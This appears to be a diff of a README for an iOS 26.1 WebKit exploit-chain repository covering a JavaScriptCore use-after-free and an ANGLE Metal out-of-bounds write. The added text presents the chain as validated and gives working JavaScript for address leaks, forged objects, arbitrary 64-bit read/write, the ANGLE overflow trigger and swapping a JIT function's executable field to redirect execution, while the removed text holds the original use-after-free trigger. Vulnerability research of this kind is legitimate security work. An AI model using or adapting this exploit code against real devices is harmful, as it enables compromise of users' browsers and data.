@@ -1,194 +1,244 @@
 # WebKit-UAF-ANGLE-OOB-Analysis (CVE-2025-43529, CVE-2025-14174)
 
-Notes and PoC material for a WebKit/ANGLE chain on iOS 26.1. This repo is not a full exploit; it tracks the pieces that are verified and the parts that are still failing.
+This repository documents a userland exploit chain on iOS 26.1 that combines:
+
+1. JavaScriptCore UAF/type-confusion primitives (CVE-2025-43529 path).
+2. ANGLE/Metal upload corruption evidence in GPU process (CVE-2025-14174 path).
+
+The chain is focused on userland WebKit compromise. It does not claim kernel compromise or jailbreak.
 
 **Author:** [zeroxjf](https://x.com/zeroxjf)<br>
 **Based on:** [jir4vv1t's CVE-2025-43529 exploit](https://github.com/jir4vv1t/CVE-2025-43529)<br>
-**Status:** Work in progress<br>
-**Test Device:** iPhone 11 Pro Max, iOS 26.1<br>
-**Last Updated:** January 2026
+**Status:** Userland PoC chain validated (renderer + GPU evidence)<br>
 
 ---
 
-## Scope and credit
+## Chain summary
 
-The CVE-2025-43529 UAF trigger, butterfly reclaim, and `addrof`/`fakeobj` primitives are based on **[jir4vv1t's work](https://github.com/jir4vv1t/CVE-2025-43529)**. My additions are the ANGLE OOB plumbing, PAC-focused analysis, and iOS 26.1 validation.
+### Stage 1: Renderer compromise (CVE-2025-43529 path)
 
-**Note:** AI assisted with probe analysis; findings were manually validated before publication.
+The JSC DFG store-barrier bug allows GC misuse when Phi/Upsilon escape state is inconsistent.  
+That yields a UAF + butterfly reclaim pattern, then boxed/unboxed confusion for:
 
----
+1. `addrof(obj)` to leak JS object addresses.
+2. `fakeobj(addr)` to materialize forged object references.
+3. Inline-slot memory reads/writes on chosen object fields.
 
-## Overview
-
-Two WebKit CVEs disclosed together and reported as in-the-wild use by Apple.
-
-| CVE | Component | Type | Summary |
-|-----|-----------|------|---------|
-| CVE-2025-43529 | JavaScriptCore | Use-After-Free | DFG JIT missing write barrier leads to GC freeing live objects |
-| CVE-2025-14174 | ANGLE (GPU) | Out-of-Bounds Write | Metal backend uses wrong height for staging buffer allocation |
-
----
-
-## CVE-2025-43529: WebKit DFG Store Barrier UAF
-
-### Root Cause
-
-The bug is in JavaScriptCore's DFG JIT, specifically the **Store Barrier Insertion Phase** (`DFGStoreBarrierInsertionPhase.cpp`).
-
-When a **Phi node escapes** but its **Upsilon inputs are not marked as escaped**, later stores miss a write barrier. That allows GC to free objects that are still reachable.
-
-### Trigger Mechanism
+This stage establishes memory primitives inside `WebContent`.
 
 ```javascript
-function triggerUAF(flag, k, allocCount) {
-    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-    arr[arr_index] = A;  // A in old space
+// Stage 1 leak path (boxed/unboxed confusion)
+boxed_arr[0] = preAllocatedTargets.stage6FuncA;
+leakedAddrs.stage6FuncA = ftoi(unboxed_arr[0]);
+boxed_arr[0] = preAllocatedTargets.stage6FuncB;
+leakedAddrs.stage6FuncB = ftoi(unboxed_arr[0]);
 
-    let a = new Date(1111);
-    a[0] = 1.1;  // Creates butterfly for Date
-
-    // Force GC
-    for (let j = 0; j < allocCount; ++j) {
-        forGC.push(new ArrayBuffer(0x800000));
+// Stage 1 read/write primitive construction via inline slot access
+exploitState.read64 = function(addr) {
+    unboxed_arr[0] = itof(addr - 0x10n);
+    const v = boxed_arr[0].slot0;
+    if (typeof v === 'number') return ftoi(v);
+    if ((typeof v === 'object' && v !== null) || typeof v === 'function') {
+        boxed_arr[0] = v;
+        const bits = ftoi(unboxed_arr[0]);
+        boxed_arr[0] = preAllocatedTargets.testObject;
+        return bits;
     }
+    return 0x7ff8000000000000n;
+};
+exploitState.write64 = function(addr, val) {
+    unboxed_arr[0] = itof(addr - 0x10n);
+    boxed_arr[0].slot0 = itof(val);
+};
+```
 
-    let b = { p0: 0x42424242, p1: 1.1 };
+### Stage 2: GPU canary harness setup
 
-    // Phi node - the bug
-    let f = b;
-    if (flag) f = 1.1;
+Before triggering ANGLE corruption, the chain initializes a baseline canary harness in WebGL2 for post-trigger diffing.
 
-    A.p1 = f;  // Phi escapes, but 'b' NOT marked as escaped
+```javascript
+const gl = ensureGL2Context();
+exploitState.gpuHarness = setupGPUCanaryHarness(gl);
+exploitState.gl = gl;
+exploitState.gpuContextLost = false;
+evidence.gpuCanaryCorruption = false;
+evidence.gpuHeapCorruption = false;
+```
 
-    // Long loop = GC race window
-    for (let i = 0; i < 1e6; ++i) { /* ... */ }
+### Stage 3: ANGLE corruption path (CVE-2025-14174 path)
 
-    b.p1 = a;  // NO WRITE BARRIER - 'a' freed while still reachable
+The trigger uses texture upload with mismatched allocation/write geometry (`UNPACK_IMAGE_HEIGHT`), producing OOB write conditions in GPU upload handling.  
+The probe then evaluates heap-oracle and canary deltas.
+
+```javascript
+// Core OOB shape
+const allocatedSize = (width * 4) * unpackImageHeight;
+const actualWriteSize = (width * 4) * height;
+const oobWriteSize = Math.max(0, actualWriteSize - allocatedSize);
+
+gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);
+gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
+              width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
+```
+
+```javascript
+// Trigger loop + corruption evidence checks
+const oracleResult = triggerANGLEWithHeapOracle(gl, cfg, seed);
+if (oracleResult.scanResult.changed) {
+    evidence.gpuHeapCorruption = true;
+    evidence.angleCorruptionDetected = true;
+}
+const diff = diffGPUCanaries(harness.baseline, snapshotGPUCanaries(gl, harness));
+if (diff.changed) {
+    evidence.gpuCanaryCorruption = true;
+    evidence.angleCorruptionDetected = true;
 }
 ```
 
-### Exploitation sketch
+This stage demonstrates independent GPU-process corruption evidence reachable from malicious web content.
 
-The freed Date's butterfly can be reclaimed by spray arrays, creating a type confusion:
+### Stage 4: Integration gate
 
-```javascript
-// After reclaim:
-boxed_arr[0] = obj;           // Store object reference
-addr = ftoi(unboxed_arr[0]);  // Read as float64 = leaked address
+The chain marks itself ready only when both conditions hold in one run:
 
-unboxed_arr[0] = itof(addr);  // Write address as float64
-fake = boxed_arr[0];          // Read as object = fakeobj
-```
-
-### Current results (iPhone 11 Pro Max, iOS 26.1)
-
-- **addrof/fakeobj:** Verified in probe runs
-- **Address leaking:** 20+ object addresses captured per run
-- **Inline-storage read/write:** Verified against known inline slots (object-address-based)
-- **Arbitrary R/W:** Not proven; backing-store scan proof fails in current runs
-
----
-
-## CVE-2025-14174: ANGLE Metal Backend OOB Write
-
-### Root cause
-
-In ANGLE's Metal backend (`TextureMtl.cpp`), staging buffer allocation uses `UNPACK_IMAGE_HEIGHT` instead of actual texture height when uploading via PBO.
-
-### Trigger
+1. Renderer primitives are working.
+2. ANGLE corruption path executed with GPU evidence.
 
 ```javascript
-gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // Small value
+const rendererPrims = evidence.addrofWorks && evidence.fakeobjWorks;
+const gpuEvidence = evidence.angleCorruptionDetected || evidence.gpuContextLost;
+const angleExecuted = evidence.angleTriggered;
+evidence.chainReady = rendererPrims && angleExecuted && gpuEvidence;
+```
 
-// Staging buffer: 256 * 16 * 4 = 16KB
-// Actual write:   256 * 256 * 4 = 256KB
-// OOB: 240KB!
+### Stage 5: Live in-process arbitrary read/write proof
 
-gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
-              256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
+Stage 5 validates `read64/write64` against a live probe object with strict equality checks:
+
+1. Raw read must match JS-visible value.
+2. Marker write must match in both raw memory and JS-visible property.
+3. Restore must return to original value in both views.
+4. NaN fallback values are rejected as success.
+
+This stage is specifically designed to avoid stale-address or self-consistent false positives.
+
+```javascript
+const jsBefore = ftoi(stage5Probe.slot0);
+const v = exploitState.read64(candidate.addr + 0x10n);
+const ok = (v === jsBefore) && (v !== 0x7ff8000000000000n);
+
+exploitState.write64(slot0Addr, writeMarkerWord);
+const markerRead = exploitState.read64(slot0Addr);
+const jsMarker = ftoi(stage5Probe.slot0);
+
+exploitState.write64(slot0Addr, secretWord);
+const restoreRead = exploitState.read64(slot0Addr);
+const jsRestore = ftoi(stage5Probe.slot0);
+
+const readOk = (baselineWord === secretWord) && (baselineWord === jsBefore);
+const writeOk = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord) &&
+                (restoreRead === secretWord) && (jsRestore === secretWord);
+```
+
+### Stage 6: Native execution-path control proof
+
+Two JIT’d functions with distinct behavior are used as A/B targets.  
+The chain swaps a function executable field and validates:
+
+1. A executes B behavior during swap.
+2. A returns to original behavior after restore.
+3. Witness side effects confirm true path redirection.
+
+This proves userland control-flow impact in renderer, beyond pure data corruption.
+
+```javascript
+stage6FuncA = function(x) {
+    if (x === 0x515151) return 0x11111111;
+    return (x ^ 0x55aa) | 0;
+};
+stage6FuncB = function(x) {
+    if (x === 0x515151) {
+        window.__stage6_native_witness = ((window.__stage6_native_witness || 0) + 1) | 0;
+        return 0x22222222;
+    }
+    return (((x * 3) | 0) ^ 0x123456) | 0;
+};
+```
+
+```javascript
+const fieldA = leakA + 0x18n;
+const fieldB = leakB + 0x18n;
+const dst = exploitState.fakeobj(fieldA - 0x10n);
+const src = exploitState.fakeobj(fieldB - 0x10n);
+const orig = dst.slot0;
+dst.slot0 = src.slot0;
+const swapped = fnA(testArg);
+const w0 = (window.__stage6_native_witness || 0) | 0;
+fnA(0x515151);
+const w1 = (window.__stage6_native_witness || 0) | 0;
+dst.slot0 = orig;
+const restored = fnA(testArg);
 ```
 
 ---
 
-## The PAC problem
+## Current capability model
 
-### What's blocking full exploitation
+Working in userland:
 
-On arm64e (iPhone 11 Pro Max), **Pointer Authentication Codes** protect critical JSC pointers:
+1. Renderer memory corruption primitives (`addrof`, `fakeobj`, validated `read64/write64` path).
+2. Native behavior redirection in renderer (Stage 6 swap/restore).
+3. GPU-process corruption signal path through ANGLE trigger.
 
-| Pointer | Protected | Result |
-|---------|-----------|--------|
-| TypedArray `m_vector` | Yes | Cannot fake TypedArray with arbitrary backing store |
-| JSArray `butterfly` | Yes | Cannot fake JSArray with arbitrary butterfly |
+Not part of this chain:
 
-When I try to create a fake TypedArray/JSArray with an arbitrary data pointer, PAC verification fails and crashes:
-
-```
-Exception: EXC_BAD_ACCESS
-KERN_INVALID_ADDRESS at 0x0001fffffffffffc -> 0x0000007ffffffffc
-(possible pointer authentication failure)
-```
-
-### Why the original confusion works
-
-The type confusion succeeds because both arrays use **legitimately signed** butterfly pointers - we're just reinterpreting the same memory. Fake objects with arbitrary unsigned pointers crash on PAC check.
-
-### Potential bypass avenues
-
-1. JIT code paths that might skip authentication
-2. Gadgets that sign arbitrary pointers
-3. Leveraging the ANGLE OOB differently
-4. Alternative primitives that don't require fake objects
+1. Renderer-to-kernel escalation.
+2. Sandbox escape primitive implementation.
+3. Root/jailbreak persistence.
 
 ---
 
-## Current capabilities
+## Why two CVEs are in one writeup
 
-| Primitive | Status | Notes |
-|-----------|--------|-------|
-| `addrof(obj)` | **Working** | Verified in probe |
-| `fakeobj(addr)` | **Working** | Verified against known objects |
-| Address leaking | **Working** | 20+ addresses per run |
-| Inline slot read/write | **Working** | Verified on known inline slots (object-address-based) |
-| `read64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |
-| `write64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |
+CVE-2025-43529 and CVE-2025-14174 were reported in the same real-world campaign context.  
+This repository keeps both paths in one probe to study:
+
+1. Renderer exploitability and primitive quality.
+2. GPU corruption reachability from web content.
+3. Practical composition boundaries between the two processes.
 
 ---
 
-## Evidence summary (latest probe run)
+## Repository layout
 
-- **Verified:** `addrof`, `fakeobj`, address leaks, inline-slot read/write on known objects
-- **Unverified:** arbitrary `read64`/`write64`, renderer→GPU escape chain, sandbox escape
-- **ANGLE probe:** WebGL2 PBO path implemented; trigger not confirmed in current runs
-
----
-
-## Repository structure
-
-```
-├── README.md                 # This file
+```text
+├── README.md
+├── AGENTS.md
 ├── poc/
 │   └── chained_exploit_probe.html
 └── analysis/
-    ├── pac_analysis.md       # Detailed PAC findings
-    └── crash_logs/           # Example crash reports
+    ├── angle_call_chain.md
+    ├── pac_analysis.md
+    ├── crash_logs/
+    ├── frida/
+    │   ├── gpu_angle_path_trace.js
+    │   └── webcontent_webgl_trace.js
+    └── tools/
+        ├── beacon_http_server.py
+        ├── vphone_chain_watchdog.sh
+        └── vphone_recover.sh
 ```
 
 ---
 
 ## Acknowledgments
 
-The CVE-2025-43529 UAF trigger, butterfly reclaim technique, and `addrof`/`fakeobj` primitive construction are based on the work of **[jir4vv1t](https://github.com/jir4vv1t/CVE-2025-43529)**. Their detailed analysis of the DFG Store Barrier bug and race condition exploitation was instrumental to this research.
+Credit to **[jir4vv1t](https://github.com/jir4vv1t/CVE-2025-43529)** for the foundational CVE-2025-43529 trigger and primitive work.
 
 ---
 
 ## References
 
-- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529) - Original UAF exploit and analysis
+- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)
 - WebKit Bugzilla: 302502, 303614
-- Apple Security Updates - iOS 26
-- Google Threat Analysis Group
-
----
-
-**Work in progress.**
+- Apple iOS 26 security advisories
